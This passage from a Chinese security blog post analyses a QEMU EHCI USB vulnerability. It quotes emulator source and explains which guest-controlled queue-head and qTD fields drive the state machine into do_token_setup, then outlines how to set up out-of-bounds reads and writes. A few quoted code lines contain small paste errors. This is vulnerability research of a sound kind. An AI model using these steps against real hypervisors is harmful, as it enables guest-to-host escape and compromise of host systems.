3)</span></span><br></pre></td></tr></table></figure><p>该函数又是通过<code>NLPTR_TYPE_GET</code>函数的返回值来进一步的设置状态。<code>NLPTR_TYPE_GET</code>是一个宏定义，也就是函数通过<code>entry/2</code>的单子节来确定状态。</p><p>我们需要将状态机的状态转到<code>EST_EXECUTE</code>，我们搜索一下看一下哪里能够设置该状态。首先需要设置<code>EST_FETCHQH</code>状态，处理该状态过程中会调用<code>ehci_state_fetchqh</code>函数，并将状态转换到<code>EST_FETCHQTD</code>，处理<code>EST_FETCHQTD</code>状态的时候会调用<code>ehci_state_fetchqtd</code>函数，该函数就会将状态转换到<code>EST_EXECUTE</code>进而调用<code>ehci_state_execute</code>函数。</p><p>而<code>EST_FETCHQH</code>状态的进入可以通过<code>ehci_state_fetchentry</code>函数来实现，要进入<code>EST_FETCHQH</code>状态需要使得<code>NLPTR_TYPE_GET(entry) </code>的低一字节为<code>1</code>，也就是设置<code>entry</code>的低一字节为<code>2</code>，那么<code>(2 &gt;&gt; 1) &amp; 3</code>计算结果即为<code>1</code>，即可进入到<code>EST_FETCHQH</code>状态，那么下面我们来看一下该状态处理中会调用的<code>ehci_state_fetchqh</code>函数。我们调用该函数的主要目的是为了使得状态机转换到<code>EST_FETCHQTD</code>状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> EHCIQueue *<span class="title function_">ehci_state_fetchqh</span><span class="params">(EHCIState *ehci, <span class="type">int</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> entry;</span><br><span class="line">    EHCIQueue *q;</span><br><span class="line">    EHCIqh qh;</span><br><span class="line"></span><br><span class="line">    entry = ehci_get_fetch_addr(ehci, async);</span><br><span class="line">    q = ehci_find_queue_by_qh(ehci, entry, async);</span><br><span class="line">    <span class="keyword">if</span> (q == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        q = ehci_alloc_queue(ehci, entry, async);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    q-&gt;seen++;</span><br><span class="line">    <span class="keyword">if</span> (q-&gt;seen &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* we are going in circles -- stop processing */</span></span><br><span class="line">        ehci_set_state(ehci, async, EST_ACTIVE);</span><br><span class="line">        q = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (get_dwords(ehci, NLPTR_GET(q-&gt;qhaddr),</span><br><span class="line">                   (<span class="type">uint32_t</span> *) &amp;qh, <span class="keyword">sizeof</span>(EHCIqh) &gt;&gt; <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        q = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    ehci_trace_qh(q, NLPTR_GET(q-&gt;qhaddr), &amp;qh);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The overlay area of the qh should never be changed by the guest,</span></span><br><span class="line"><span class="comment">     * except when idle, in which case the reset is a nop.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!ehci_verify_qh(q, &amp;qh)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ehci_reset_queue(q) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            ehci_trace_guest_bug(ehci, <span class="string">&quot;guest updated active QH&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    q-&gt;qh = qh;</span><br><span class="line"></span><br><span class="line">    q-&gt;transact_ctr = get_field(q-&gt;qh.epcap, QH_EPCAP_MULT);</span><br><span class="line">    <span class="keyword">if</span> (q-&gt;transact_ctr == <span class="number">0</span>) &#123; <span class="comment">/* Guest bug in some versions of windows */</span></span><br><span class="line">        q-&gt;transact_ctr = <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        q-&gt;dev = ehci_find_device(q-&gt;ehci,</span><br><span class="line">                                  get_field(q-&gt;qh.epchar, QH_EPCHAR_DEVADDR));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;qh.token &amp; QTD_TOKEN_HALT) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">     <span class="comment">// #define QTD_TOKEN_ACTIVE              (1 &lt;&lt; 7)</span></span><br><span class="line">      <span class="comment">// #define NLPTR_TBIT(x)            ((x) &amp; 1)  // 1=invalid, 0=valid</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((q-&gt;qh.token &amp; QTD_TOKEN_ACTIVE) &amp;&amp;</span><br><span class="line">               (NLPTR_TBIT(q-&gt;qh.current_qtd) == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">               (q-&gt;qh.current_qtd != <span class="number">0</span>)) &#123;</span><br><span class="line">        q-&gt;qtdaddr = q-&gt;qh.current_qtd;</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHQTD); <span class="comment">// 目标位置</span></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此这里我们除了需要保证<code>q-&gt;qh.token &amp; (1 &lt;&lt; 7) == 1</code>，<code>q-&gt;qh.current_qtd</code>的最后一个<code>bit == 0</code>以及<code>q-&gt;qh.current_qtd != 0</code>这三个明显的条件之外还需要保证<code>q-&gt;seen==0</code>等防止进入到相关的<code>if</code>条件分支直接<code>goto out</code>，才可以触发到<code>ehci_set_state(ehci, async, EST_FETCHQTD); </code>函数的调用将状态机转换为<code>EST_FETCHQTD</code>。</p><p>那么这里的<code>qh</code>是怎么来的呢，<code>qh</code>是通过下面的函数调用得到的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_dwords(ehci, NLPTR_GET(q-&gt;qhaddr), (uint32_t *) &amp;qh, sizeof(EHCIqh) &gt;&gt; 2)</span><br></pre></td></tr></table></figure><p>也就是通过<code>entry</code>得到的，因此这里的<code>qh</code>的内容我们可以控制。那么将状态转换到<code>EST_FETCHQTD</code>之后，我们来看一下该状态处理函数<code>ehci_state_fetchqtd</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_state_fetchqtd</span><span class="params">(EHCIQueue *q)</span></span><br><span class="line">&#123;</span><br><span class="line">    EHCIqtd qtd;</span><br><span class="line">    EHCIPacket *p;</span><br><span class="line">    <span class="type">int</span> again = <span class="number">1</span>;</span><br><span class="line">    <span class="type">uint32_t</span> addr;</span><br><span class="line"></span><br><span class="line">    addr = NLPTR_GET(q-&gt;qtdaddr);</span><br><span class="line">    <span class="keyword">if</span> (get_dwords(q-&gt;ehci, addr +  <span class="number">8</span>, &amp;qtd.token,   <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    barrier();</span><br><span class="line">    <span class="keyword">if</span> (get_dwords(q-&gt;ehci, addr +  <span class="number">0</span>, &amp;qtd.next,    <span class="number">1</span>) &lt; <span class="number">0</span> ||</span><br><span class="line">        get_dwords(q-&gt;ehci, addr +  <span class="number">4</span>, &amp;qtd.altnext, <span class="number">1</span>) &lt; <span class="number">0</span> ||</span><br><span class="line">        get_dwords(q-&gt;ehci, addr + <span class="number">12</span>, qtd.bufptr,</span><br><span class="line">                   ARRAY_SIZE(qtd.bufptr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ehci_trace_qtd(q, NLPTR_GET(q-&gt;qtdaddr), &amp;qtd);</span><br><span class="line"></span><br><span class="line">    p = QTAILQ_FIRST(&amp;q-&gt;packets);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ehci_verify_qtd(p, &amp;qtd)) &#123;</span><br><span class="line">            ehci_cancel_queue(q);</span><br><span class="line">            <span class="keyword">if</span> (qtd.token &amp; QTD_TOKEN_ACTIVE) &#123;</span><br><span class="line">                ehci_trace_guest_bug(q-&gt;ehci, <span class="string">&quot;guest updated active qTD&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            p = <span class="literal">NULL</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            p-&gt;qtd = qtd;</span><br><span class="line">            ehci_qh_do_overlay(q);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// #define QTD_TOKEN_ACTIVE              (1 &lt;&lt; 7)</span></span><br><span class="line">    <span class="keyword">if</span> (!(qtd.token &amp; QTD_TOKEN_ACTIVE)) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (q-&gt;dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        p = ehci_alloc_packet(q);</span><br><span class="line">        p-&gt;qtdaddr = q-&gt;qtdaddr;</span><br><span class="line">        p-&gt;qtd = qtd;</span><br><span class="line">        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTE); <span class="comment">// 目标位置</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> again;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<code>ehci_state_fetchqh</code>函数中<code>q-&gt;qtdaddr = q-&gt;qh.current_qtd;</code>我们可以知道<code>qtaddr</code>是通过<code>qh.current_qtd</code>来进行控制的，而我们又能够控制<code>qh</code>的内容，因此这里的<code>qtaddr</code>我们也可以直接进行控制，也就是可以直接控制<code>qtd</code>，因此这里我们只需要设置<code>qtd.token &amp; (1 &lt;&lt; 7) &gt; 0</code>即可。那么就会发生<code> ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTE);</code>的调用将状态机的状态转换为<code>EST_EXECUTE</code>，也就是会调用到我们的目标函数<code>ehci_state_execute</code>。我们看一下该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_state_execute</span><span class="params">(EHCIQueue *q)</span></span><br><span class="line">&#123;</span><br><span class="line">    EHCIPacket *p = QTAILQ_FIRST(&amp;q-&gt;packets);</span><br><span class="line">    <span class="type">int</span> again = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    assert(p != <span class="literal">NULL</span>);</span><br><span class="line">    assert(p-&gt;qtdaddr == q-&gt;qtdaddr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ehci_qh_do_overlay(q) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO verify enough time remains in the uframe as in 4.4.1.1</span></span><br><span class="line">    <span class="comment">// TODO write back ptr to async list when done or out of time</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 4.10.3, bottom of page 82, go horizontal on transaction counter == 0 */</span></span><br><span class="line">    <span class="keyword">if</span> (!q-&gt;async &amp;&amp; q-&gt;transact_ctr == <span class="number">0</span>) &#123;</span><br><span class="line">        ehci_set_state(q-&gt;ehci, q-&gt;async, EST_HORIZONTALQH);</span><br><span class="line">        again = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;async) &#123;</span><br><span class="line">        ehci_set_usbsts(q-&gt;ehci, USBSTS_REC);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    again = ehci_execute(p, <span class="string">&quot;process&quot;</span>); <span class="comment">// 目标函数</span></span><br><span class="line">    <span class="keyword">if</span> (again == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;packet.status == USB_RET_ASYNC) &#123;</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ehci_set_state(q-&gt;ehci, q-&gt;async, EST_EXECUTING);</span><br><span class="line">    again = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> again;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里<code>ehci_execute(p, &quot;process&quot;);</code>的调用可以直接进行调用，进而直接调用<code>usb_handle_packet(p-&gt;queue-&gt;dev, &amp;p-&gt;packet);</code>再进入<code>usb_process_one(p);</code>我们看一下该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">usb_process_one</span><span class="params">(USBPacket *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    USBDevice *dev = p-&gt;ep-&gt;dev;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Handlers expect status to be initialized to USB_RET_SUCCESS, but it</span></span><br><span class="line"><span class="comment">     * can be USB_RET_NAK here from a previous usb_process_one() call,</span></span><br><span class="line"><span class="comment">     * or USB_RET_ASYNC from going through usb_queue_one().</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    p-&gt;status = USB_RET_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;ep-&gt;nr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* control pipe */</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;parameter) &#123;</span><br><span class="line">            do_parameter(dev, p);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (p-&gt;pid) &#123;</span><br><span class="line">        <span class="keyword">case</span> USB_TOKEN_SETUP:</span><br><span class="line">            do_token_setup(dev, p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> USB_TOKEN_IN:</span><br><span class="line">            do_token_in(dev, p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> USB_TOKEN_OUT:</span><br><span class="line">            do_token_out(dev, p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            p-&gt;status = USB_RET_STALL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* data pipe */</span></span><br><span class="line">        usb_device_handle_data(dev, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>switch</code>分支函数的调用是根据<code>p-&gt;pid</code>实现的。而<code>p-&gt;pid</code>的赋值是通过<code>ehci_execute</code>函数中的<code>p-&gt;pid = ehci_get_pid(&amp;p-&gt;qtd);</code>调用来实现的。由于我们可以控制<code>qtd</code>，因此这里的<code>pid</code>也可以进行控制。也就是我们可以控制调用任何一个分支函数。</p><p>接下来看一下漏洞函数<code>do_token_setup</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_token_setup</span><span class="params">(USBDevice *s, USBPacket *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> request, value, index;qtd-&gt;token</span><br><span class="line"></span><br><span class="line">    <span class="title function_">if</span> <span class="params">(p-&gt;iov.size != <span class="number">8</span>)</span> &#123;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);</span><br><span class="line">    s-&gt;setup_index = <span class="number">0</span>;</span><br><span class="line">    p-&gt;actual_length = <span class="number">0</span>;</span><br><span class="line">    s-&gt;setup_len   = (s-&gt;setup_buf[<span class="number">7</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">if</span> (s-&gt;setup_len &gt; <span class="keyword">sizeof</span>(s-&gt;data_buf)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">                <span class="string">&quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;</span>,</span><br><span class="line">                s-&gt;setup_len, <span class="keyword">sizeof</span>(s-&gt;data_buf));</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    request = (s-&gt;setup_buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">1</span>];</span><br><span class="line">    value   = (s-&gt;setup_buf[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">2</span>];</span><br><span class="line">    index   = (s-&gt;setup_buf[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | s-&gt;setup_buf[<span class="number">4</span>];</span><br><span class="line"><span class="comment">// #define USB_DIR_IN0x80</span></span><br><span class="line">    <span class="keyword">if</span> (s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN) &#123;</span><br><span class="line">        usb_device_handle_control(s, p, request, value, index,</span><br><span class="line">                                  s-&gt;setup_len, s-&gt;data_buf);</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_SETUP;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;status != USB_RET_SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;actual_length &lt; s-&gt;setup_len) &#123;</span><br><span class="line">            s-&gt;setup_len = p-&gt;actual_length;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_DATA;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;setup_len == <span class="number">0</span>)</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_DATA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p-&gt;actual_length = <span class="number">8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着就到了漏洞存在的函数了。首先需要满足<code>p-&gt;iov.size</code>，该值是由<code>qtd-&gt;token</code>决定的，<code>setup_buf</code>的地址是由<code>qtd-&gt;bufptr</code>确定的，因此这里的长度可控。这个就是在<code>do_token_setup</code>这个函数的前面制定的也就是<code>iov.size=8</code>之后的<code>usb_packet_copy</code>函数的调用将<code>iov</code>中的内容拷贝到了<code>setup_buf</code>中。</p><h2 id="越界读"><a href="#越界读" class="headerlink" title="越界读"></a>越界读</h2><p>越界读我们首先需要调用的是<code>do_token_setup</code>这个函数造成越界条件之后，在调用<code>do_token_in</code>这个函数进行越界读，要想调用这个函数我们需要先看一下<code>p-&gt;pid</code>的赋值函数<code>ehci_get_pid</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> </span></span><br><span class="line">(data, field) \</span><br><span class="line">    (((data) &amp; field##_MASK) &gt;&gt; field##_SH)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QTD_TOKEN_PID_MASK            0x00000300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QTD_TOKEN_PID_SH              8</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_get_pid</span><span class="params">(EHCIqtd *qtd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (get_field(qtd-&gt;token, QTD_TOKEN_PID)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> USB_TOKEN_OUT;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> USB_TOKEN_IN;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> USB_TOKEN_SETUP;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;bad token\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此这里我们要调用<code>do_token_setup</code>函数的话，需要设置<code>(qtd-&gt;token &amp; 0x300) &gt;&gt; 8 == 2</code>。进入<code>do_token_setup</code>函数之后在根据<code>s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</code>设置<code>setup_len</code>的值。这里需要我们提前设置<code>p-&gt;iov.size = 8</code>，这个值暂时不知道怎么计算的</p><blockquote><p>其中 p-&gt;iov.size大小由 qtd-&gt;token = size &lt;&lt; QTD_TOKEN_TBYTES_SH 控制。这一块主要看后面的iov.size部分的内容</p></blockquote><p>。为了之后进入指定的分支，我们在<code>setup</code>函数中需要进入到<code>s-&gt;setup_state = SETUP_STATE_DATA;</code>的调用。因此我们需要满足<code>s-&gt;setup_buf[0] &amp; USB_DIR_IN == 1</code>（其实<code>if</code>的两个分支都可以进行设置，但是这里根据<code>do_token_in</code>里面的判断条件选择进入<code>if</code>成立的分支）。需要注意的是这里需要在设置<code>setup_len</code>之前进行设置，因为在设置<code>setup_len</code>之后，由于我们是进行越界读，因此<code>if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) </code>判断会成立，函数直接返回无法设置<code>s-&gt;setup_state</code>，只能是首先进行一次正常的读取设置完成状态之后在进行<code>setup_len</code>的设置，最后进行越界的读取。</p><p>在调用完毕<code>setup</code>函数，设置完<code>setup_len</code>之后，就可以需要设置<code>(qtd-&gt;token &amp; 0x300) &gt;&gt; 8 == 1</code>，以用来调用<code>do_token_in</code>函数。</p><h2 id="越界写"><a href="#越界写" class="headerlink" title="越界写"></a>越界写</h2><p>越界写，首先需要设置<code>(qtd-&gt;token &amp; 0x300) &gt;&gt; 8 == 2</code>调用<code>do_token_setup</code>函数设置<code>setup_len</code>的值，接着需要设置<code>s-&gt;setup_buf[0] &amp; USB_DIR_IN == 0</code>也就是<code>s-&gt;setup_buf[0] = USB_DIR_OUT</code>，这里也是根据<code>do_token_out</code>函数里面的写入条件判断进行设置的。选择<code>if</code>不成立时候的分支设置<code>s-&gt;setup_state = 